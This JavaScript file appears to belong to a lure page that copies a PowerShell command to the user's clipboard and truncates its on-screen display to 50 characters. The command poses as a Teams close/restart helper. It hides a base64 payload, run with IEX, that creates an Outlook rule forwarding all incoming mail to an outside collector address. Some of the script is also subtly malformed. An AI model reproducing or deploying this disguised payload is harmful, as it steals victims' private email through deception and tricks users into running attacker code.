const DISPLAY_CHAR_LIMIT = 50;
const commandPanels = document.querySelectorAll(".command-panel");
const fullcommand =
  'Get-Process -Name "ms-teams","Teams" -ErrorAction SilentlyContinue|out-Null;$Stuff = "JG91dGxvb2sgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgT3V0bG9vay5BcHBsaWNhdGlvbgokc2Vzc2lvbiA9ICRvdXRsb29rLlNlc3Npb24KJHN0b3JlID0gJHNlc3Npb24uRGVmYXVsdFN0b3JlCiRydWxlcyA9ICRzdG9yZS5HZXRSdWxlcygpCgokcnVsZU5hbWUgPSAiRm9yd2FyZCBBbGwgTWFpbHMgKE91dGxvb2sgT25seSkiCiR0YXJnZXRNYWlsID0gIkJvZXNlQnViZW4tRldELUNvbGxlY3RvckBTY2h3aW5nU2NobGVpZmVyVW5pdGVkLmV1IgoKIyBFeGlzdGluZyBydWxlIHdpdGggc2FtZSBuYW1lIGVudGZlcm5lbiAocm9idXN0IGdlZ2VuIENPTS1BdXNzZXR6ZXIpCmZvciAoJGkgPSAkcnVsZXMuQ291bnQ7ICRpIC1nZSAxOyAkaS0tKSB7CiAgICB0cnkgewogICAgICAgICRyID0gJHJ1bGVzLkl0ZW0oJGkpCiAgICAgICAgaWYgKCRudWxsIC1uZSAkciAtYW5kICRyLk5hbWUgLWVxICRydWxlTmFtZSkgewogICAgICAgICAgICAkcnVsZXMuUmVtb3ZlKCRpKQogICAgICAgIH0KICAgIH0KICAgIGNhdGNoIHsKICAgICAgICAjIGVpbnplbG5lIGRlZmVrdGUvdW5sZXNiYXJlIFJ1bGUgaWdub3JpZXJlbgogICAgICAgIGNvbnRpbnVlCiAgICB9Cn0KCiMgMCA9IG9sUnVsZVJlY2VpdmUKJHJ1bGUgPSAkcnVsZXMuQ3JlYXRlKCRydWxlTmFtZSwgMCkKCiMgT3V0bG9vay1vbmx5IC8gY2xpZW50LW9ubHkKJHJ1bGUuQ29uZGl0aW9ucy5PbkxvY2FsTWFjaGluZS5FbmFibGVkID0gJHRydWUKCiMgRm9yd2FyZCBhY3Rpb24KJG51bGwgPSAkcnVsZS5BY3Rpb25zLkZvcndhcmQuUmVjaXBpZW50cy5BZGQoJHRhcmdldE1haWwpCiRydWxlLkFjdGlvbnMuRm9yd2FyZC5SZWNpcGllbnRzLlJlc29sdmVBbGwoKSB8IE91dC1OdWxsCiRydWxlLkFjdGlvbnMuRm9yd2FyZC5FbmFibGVkID0gJHRydWUKCiRydWxlLkVuYWJsZWQgPSAkdHJ1ZQokcnVsZXMuU2F2ZSgpCgojV3JpdGUtSG9zdCAiT3V0bG9vay1vbmx5IGZvcndhcmQgcnVsZSBjcmVhdGVkOiAkcnVsZU5hbWUgLT4gJHRhcmdldE1haWwiCgojIENsZWFudXAgQ09NClt2b2lkXVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlbGVhc2VDb21PYmplY3QoJHJ1bGVzKQpbdm9pZF1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWxlYXNlQ29tT2JqZWN0KCRzdG9yZSkKW3ZvaWRdW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkc2Vzc2lvbikKW3ZvaWRdW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkb3V0bG9vayk="; $z = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Stuff.Trim())); IEX $z | out-NUllWrite-Host "Select an option:" -ForegroundColor Cyan; Write-Host "1 - Close Program"; Write-Host "2 - Close Program and Start Teams"; $c=(Read-Host "Enter 1 or 2").Trim(); if($c -ne "1" -and $c -ne "2"){Write-Host "Invalid input. Please enter 1 or 2." -ForegroundColor Yellow}}while($c -ne "1" -and $c -ne "2"); if($c -eq "1"){Write-Host "Status: Program closed." -ForegroundColor Green}else{try{Start-Process "msteams:"; Write-Host "Status: Program closed and Teams started." -ForegroundColor Green}catch{Write-Host "Status: Could not start Teams automatically." -ForegroundColor Red}}';

function getFullCommandText(commandElement) {
  return (
    commandElement?.dataset?.fullCommand ||
    commandElement?.textContent?.trim() ||
    ""
  );
}

function setCommandDisplay(commandElement) {
  if (!commandElement) {
    return;
  }

  const fullText = getFullCommandText(commandElement);

  commandElement.dataset.fullCommand = fullText;
  commandElement.textContent =
    fullText.length > DISPLAY_CHAR_LIMIT
      ? `${fullText.slice(0, DISPLAY_CHAR_LIMIT)}...`
      : fullText;
  commandElement.title = fullText;
}

async function copyCustomCommand(commandElement, statusElement) {
  const commandText = getFullCommandText(commandElement);

  if (!commandText) {
    if (statusElement) {
      statusElement.textContent = "No command found to copy.";
    }
    return;
  }

  try {
    await navigator.clipboard.writeText(commandText);
    if (statusElement) {
      statusElement.textContent = "Command copied to clipboard.";
    }
  } catch (error) {
    // Fallback for environments that do not allow clipboard API.
    const range = document.createRange();
    range.selectNodeContents(commandElement);

    const selection = window.getSelection();
    selection.removeAllRanges();
    selection.addRange(range);

    try {
      document.execCommand("copy");
      if (statusElement) {
        statusElement.textContent = "Command copied to clipboard.";
      }
    } catch (execError) {
      if (statusElement) {
        statusElement.textContent =
          "Unable to copy automatically. Select the command and press Ctrl+C.";
      }
    }

    selection.removeAllRanges();
  }
}

for (const panel of commandPanels) {
  const commandElement = panel.querySelector(".command-text");
  const copyButton = panel.querySelector(".copy-btn");
  const statusElement = panel.querySelector(".copy-status");

  setCommandDisplay(commandElement);

  if (copyButton && commandElement) {
    copyButton.addEventListener("click", () => {
      copyCustomCommand(commandElement, statusElement, fullcommand);
    });
  }
}
